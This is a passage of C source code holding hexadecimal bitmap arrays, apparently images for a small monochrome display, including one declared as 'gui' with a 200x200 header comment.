0X00,0X07,0XFF,0XFF,0XE0,0X3F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0X00,0X00,0X03,0XFC,0X00,0X00,0X0F,0XFF,0XFF,0XE0,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X80,0X00,0X07,
0XFC,0X00,0X00,0X1F,0XFF,0XFF,0XE1,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X80,0X00,0X0F,0XFC,0X00,0X00,0X7F,0XFF,0XFF,0XC7,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X80,
0X00,0X1F,0XF8,0X00,0X00,0XFF,0XFF,0XFF,0XCF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X80,0X00,0X3F,0XF8,0X00,0X03,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0X80,0X00,0X7F,0XF8,0X00,0X07,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X80,0X00,0XFF,0XF8,0X00,0X1F,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0X80,0X01,0XFF,0XF8,0X00,0X3F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X80,0X03,0XFF,0XF8,
0X00,0X7F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0X80,0X07,0XFF,0XF0,0X00,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X80,0X0F,
0XFF,0XF0,0X03,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X80,0X1F,0XFF,0XF0,0X07,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0X80,0X3F,0XFF,0XF0,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X80,0X7F,0XFF,0XF0,0X3F,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0X80,0XFF,0XFF,0XE0,0X7F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XC1,0XFF,0XFF,0XE0,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XC3,0XFF,0XFF,0XE3,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XC7,0XFF,0XFF,
0XE7,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XCF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XDF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,};


const unsigned char gui[5000] = { /* 0X01,0X01,0XC8,0X00,0XC8,0X00, */
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF8,0X3F,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF0,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFE,0X7C,0X7C,0X7F,0XFF,0XFF,0XFF,
0XE0,0X0F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFC,0X3C,0X38,0X7F,0XFF,0XFF,0XFF,0XE3,0X8F,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFC,0X3C,0X38,0X7F,0XFF,
0XFF,0XFF,0XE1,0X8F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFC,0X3C,0X38,0X7F,0XFF,0XFF,0XFF,0XE0,0X0F,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFC,0X7C,0X3C,0X38,
0X7F,0XFF,0XFF,0XFF,0XF0,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XF8,0X7C,0X3C,0X38,0X7F,0XFF,0XFF,0XFF,0XF8,0X3F,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XE0,0X7C,
0X3C,0X38,0X7F,0XFF,0XFF,0XFF,0XFF,0XF0,0X0F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XE0,0X7C,0X3C,0X38,0X7F,0XFF,0XFF,0XFF,0XFF,
0XC0,0X03,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X00,0XFF,0XFF,0XFF,0XFF,
0XC1,0XFC,0X3C,0X38,0X7F,0XFF,0XFF,0XFF,0XFF,0X80,0X00,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XF8,0X00,0X1F,0XFF,0XFF,0XFF,0XC3,0XFC,0X3C,0X38,0X7F,0XFF,0XFF,
0XFF,0XFF,0X07,0XE0,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XC0,0X00,0X07,0XFF,
0XFF,0XFF,0X87,0XFC,0X3C,0X38,0X7F,0XFF,0XFF,0XFF,0XFF,0X1F,0XF8,0X7F,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0X00,0X00,0X01,0XFF,0XFF,0XFF,0X87,0XFC,0X3C,0X38,0X7F,
0XFF,0XFF,0XFF,0XFE,0X1F,0XFC,0X7F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFC,0X03,0XFF,
0X80,0XFF,0XFF,0XFF,0X87,0XFC,0X3C,0X38,0X7F,0XFF,0XFF,0XFF,0XFE,0X3F,0XFC,0X7F,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF8,0X0F,0XFF,0XF0,0X3F,0XFF,0XFF,0X87,0XFC,0X3C,
0X38,0X7F,0XFF,0XFF,0XFF,0XFE,0X3F,0XFC,0X7F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XE0,
0X3F,0XFF,0XF8,0X1F,0XFF,0XFF,0XC3,0XF8,0X7C,0X38,0X7F,0XFF,0XFF,0XFF,0XFE,0X3F,
0XFC,0X7F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XC0,0XFF,0XFF,0XFE,0X0F,0XFF,0XFF,0XC3,
0XF8,0X7C,0X38,0X7F,0XFF,0XFF,0XFF,0XFE,0X1F,0XF8,0X7F,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0X81,0XFF,0XFF,0XFF,0X0F,0XFF,0XFF,0XE0,0XE0,0XFC,0X38,0X7F,0XFF,0XFF,0XFF,
0XFF,0X0F,0XF0,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFE,0X07,0XFF,0XFF,0XFF,0X87,0XFF,
0XFF,0XE0,0X00,0XFC,0X38,0X7F,0XFF,0XFF,0XFF,0XFF,0X8F,0XF0,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFC,0X0F,0XFF,0XFF,0XFF,0XC3,0XFF,0XFF,0XF0,0X01,0XFC,0X38,0X7F,0XFF,
0XFF,0XFF,0XFF,0XDF,0XF9,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF8,0X3F,0X03,0XFF,0XE3,
0XC3,0XFF,0XFF,0XFC,0X07,0XFC,0X38,0X7F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XE0,0X7E,0X01,0XFF,0XC3,0XE1,0XFF,0XFF,0XFF,0XFF,0XFC,0X38,
0X7F,0X87,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X87,0XFF,0XFF,0XFF,0XC0,0XFC,0X01,
0XFF,0X83,0XE1,0XFF,0XFF,0XFF,0XFF,0XFC,0X38,0X7F,0X03,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFC,0X01,0XFF,0XFF,0XFF,0X81,0XFC,0X30,0XFF,0X07,0XF0,0XFF,0XFF,0XFF,0XFF,
0XFC,0X38,0X7F,0X80,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF8,0X00,0X7F,0XFF,0XFE,0X07,
0XFC,0X70,0XFE,0X0F,0XF0,0XFF,0XFF,0XFF,0XFF,0XFC,0X38,0X7F,0XC0,0X7F,0XFF,0XFF,
0X80,0X00,0X00,0X20,0X20,0X3F,0XFF,0XFC,0X0F,0XFC,0X70,0XFC,0X1F,0XF0,0XFF,0XFF,
0XFC,0X3F,0XFC,0X38,0X7F,0XF0,0X7F,0XFF,0XFC,0X00,0X00,0X00,0X01,0XFC,0X1F,0XFF,
0XF8,0X3F,0XFC,0X20,0XF8,0X3F,0XF8,0X7F,0XFF,0XF0,0X1F,0XFC,0X38,0X7F,0XF8,0X3F,
0XFF,0XF8,0X00,0X00,0X00,0X03,0XFE,0X1F,0XFF,0XE0,0X7F,0XFC,0X01,0XF0,0X7F,0XF8,
0X7F,0XFF,0XC0,0X3F,0XFC,0X38,0X7F,0XFC,0X1F,0XFF,0XF0,0X00,0X00,0X00,0X07,0XDF,
0X0F,0XFF,0XC0,0XFF,0XFE,0X01,0XE0,0XFF,0XF8,0X7F,0XFF,0X80,0X7F,0XFC,0X38,0X7F,
0XFE,0X1F,0XFF,0XF0,0XFF,0XFF,0XFF,0XFF,0X07,0X8F,0XFF,0X03,0XFF,0XFF,0X07,0XC1,
0XFF,0XF8,0X7F,0XFF,0X03,0XFF,0XFC,0X38,0X7F,0XFE,0X1F,0XFF,0XE1,0XFF,0XFF,0XFF,
0XFE,0X03,0X87,0XFF,0X03,0XFF,0XFF,0XFF,0X83,0XE3,0XF8,0X7F,0XFE,0X0F,0XFF,0XFC,
0X38,0X7F,0XFF,0X1F,0XFF,0XE3,0XFF,0XC0,0X00,0X00,0X03,0X87,0XFF,0X81,0XFF,0XFF,
0XFF,0X07,0X80,0XF8,0X7F,0XFC,0X1F,0XFF,0XFC,0X38,0X7F,0XFF,0X1F,0XFF,0XE3,0XFF,
0XC0,0X00,0X00,0X03,0X87,0XFF,0XC0,0X7F,0XFF,0XFE,0X0F,0X00,0X78,0X7F,0XFC,0X3F,
0XFF,0XFC,0X38,0X7F,0XFF,0X1F,0XFF,0XE1,0XFF,0XE0,0X00,0X00,0X03,0X87,0XFF,0XF0,
0X3F,0XFF,0XFC,0X1F,0X00,0X78,0X7F,0XF8,0X7F,0XFF,0XFC,0X38,0X7F,0XFE,0X1F,0XFF,
0XF1,0XFF,0XFF,0XFF,0XFF,0X03,0X87,0XFF,0XF8,0X1F,0XFF,0XF8,0X3E,0X1C,0X38,0XFF,
0XF8,0X7F,0XFF,0XFC,0X3C,0X3F,0XFE,0X1F,0XFF,0XF0,0X7F,0XFF,0XFF,0XFF,0X8F,0X8F,
0XFF,0XFE,0X07,0XFF,0XF0,0X7E,0X1C,0X30,0XFF,0XF8,0XFF,0XFF,0XFC,0X3C,0X3F,0XFE,
0X1F,0XFF,0XF8,0X00,0X00,0X00,0X03,0XFF,0X0F,0XFF,0XFF,0X03,0XFF,0XE0,0XFE,0X1C,
0X30,0XFF,0XF0,0XFF,0XFF,0XFC,0X3C,0X1F,0XFC,0X3F,0XFF,0XFC,0X00,0X00,0X00,0X01,
0XFE,0X1F,0XFF,0XFF,0XC1,0XFF,0XC1,0XFF,0X00,0X71,0XFF,0XF0,0XFF,0XFF,0XFC,0X3E,
0X0F,0XF8,0X3F,0XFF,0XFF,0X00,0X00,0X00,0X00,0X78,0X3F,0XFF,0XFF,0XE0,0X7F,0X83,
0XFF,0X00,0X61,0XFF,0XF0,0XFF,0XFF,0XFC,0X3F,0X07,0XE0,0X7F,0XFF,0XFF,0X8F,0XE3,
0XF8,0XF0,0X00,0X7F,0XFF,0XFF,0XF0,0X3F,0X87,0XFF,0X80,0XE1,0XFF,0XF0,0XFF,0XFF,
0XFC,0X7F,0X80,0X00,0XFF,0XFF,0XFF,0X8F,0XE3,0XF8,0XFC,0X00,0XFF,0XFF,0XFF,0XF8,
0X1F,0XCF,0XFF,0XE3,0XC3,0XFF,0XF0,0XFF,0XFF,0XFC,0X7F,0XC0,0X01,0XFF,0XFF,0XFF,
0X8F,0XE3,0XF8,0XFF,0X03,0XFF,0XFF,0XFF,0XFE,0X07,0XFF,0XFF,0XFF,0X87,0XFF,0XF0,
0XFF,0XFF,0XFC,0X7F,0XF0,0X07,0XFF,0XFF,0XFF,0X8F,0XE3,0XFD,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0X03,0XFF,0XFF,0XFF,0X07,0XFF,0XF0,0XFF,0XFF,0XF8,0X7F,0XFE,0X3F,0XFF,
0XFF,0XFF,0X8F,0XE3,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X80,0XFF,0XFF,0XFE,0X0F,
0XFF,0XF8,0XFF,0XFF,0XF8,0X7F,0XFF,0XFF,0XFF,0XFF,0XFF,0X8F,0XF7,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XE0,0X7F,0XFF,0XFC,0X1F,0XFF,0XF8,0X7F,0XFF,0XF8,0X7F,0XFF,
0XFF,0XFF,0XFF,0XFF,0X8F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF0,0X1F,0XFF,
0XF0,0X3F,0XFF,0XF8,0X7F,0XFF,0XF0,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFC,0X07,0XFF,0XC0,0X7F,0XFF,0XFC,0X3F,0XFF,0XE0,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFE,
0X00,0XFE,0X00,0XFF,0XFF,0XFC,0X1F,0XFF,0XC1,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X80,0X00,0X03,0XFF,0XFF,0XFE,0X0F,
0XFF,0X83,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XF0,0X00,0X0F,0XFF,0XFF,0XFF,0X03,0XFE,0X07,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFC,0X00,0X7F,0XFF,0XFF,
0XFF,0X80,0X30,0X0F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XC0,0X00,0X1F,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XF0,0X00,0X7F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFC,0X01,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
